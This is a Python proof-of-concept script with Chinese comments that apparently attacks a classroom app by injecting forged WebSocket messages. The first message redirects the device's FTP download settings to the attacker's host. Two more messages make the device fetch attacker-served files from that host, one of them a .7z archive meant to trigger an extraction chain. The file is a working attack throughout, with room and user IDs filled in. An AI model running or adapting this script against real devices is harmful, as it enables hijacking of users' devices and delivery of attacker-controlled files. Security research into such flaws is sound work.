# -*- coding: utf-8 -*-
"""inject_50001_plus_phrase.py - 先设 FTP 参数(50001)，再用短语(type=3)触发下载。
观察点: fake_classroom 8080 是否收到端侧请求（= FTP 劫持生效）。
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def frame(mtype, data, cid, tag="canvas_tag", cmd=2):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=10):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    # 1) 50001: 设置 FTP 参数, rootPath=/mnt/sdcard/xhproxy
    ftp = {"hostName": OUR, "port": 8080, "rootPath": "/mnt/sdcard/xhproxy",
           "downloadWaitTime": 3, "startLimitRate": 0.015}
    inj(frame(50001, json.dumps(ftp, ensure_ascii=False), "179P00001", "default_tag", cmd=0),
        "50001 FTP参数(rootPath=/mnt/sdcard/xhproxy)", 10)
    # 2) type=3 短语: 触发下载(文件名 = 代理开关密文)
    inj(frame(3, json.dumps({"voiceId": "QZWOQSFOQEDOQPQFXFX",
                             "voiceUrl": "http://%s:80/QZWOQSFOQEDOQPQFXFX" % OUR},
                            ensure_ascii=False), "179P00002", "canvas_tag"),
        "type=3 短语(QZWOQSFOQEDOQPQFXFX)", 10)
    # 3) 再来一个带 .7z 的短语(保证解压链)
    inj(frame(3, json.dumps({"voiceId": "poc7z",
                             "voiceUrl": "http://%s:80/poc7z.7z" % OUR},
                            ensure_ascii=False), "179P00003", "canvas_tag"),
        "type=3 短语(poc7z.7z)", 10)
    print("done", flush=True)


if __name__ == "__main__":
    main()
